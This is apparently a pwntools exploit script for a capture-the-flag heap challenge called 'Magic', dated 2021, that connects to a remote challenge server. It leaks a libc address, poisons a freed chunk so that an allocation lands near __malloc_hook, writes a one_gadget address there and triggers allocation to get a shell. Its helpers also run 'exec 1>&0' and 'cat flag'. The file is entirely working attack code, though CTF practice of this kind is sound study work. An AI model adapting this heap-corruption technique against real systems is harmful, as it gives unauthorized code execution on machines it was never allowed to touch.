# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './Magic'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
context.log_level = 'debug' 
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26362'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice:',num)

def add(  idx ):
    cmd('001')
    sla('idx' , idx)

def edit( idx,Magi ):
    cmd('002')
    sla('idx' , idx)
    sa('Magic' , Magi)

def delete(  idx ):
    cmd('003')
    sla('idx' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add('000')
    edit( '000' , '\x78' )
    leak = l64()
    
    __malloc_hook = leak - 0x68 - 0x200
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    realloc = libc.sym['realloc']
    ogg = one_gadget(libc.path)[2] + libc.address
    lg('realloc' , realloc)

    lg('leak' , leak)
    delete('000')

    edit('000' , p64(__malloc_hook - 0x23))

    add('001')
    add('001')

    edit('001' , 'a'*0x13 + p64(ogg))
    add('001')
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   Magic.py
@Time    :   2021/11/07 12:07:11
@Author  :   Niyah
'''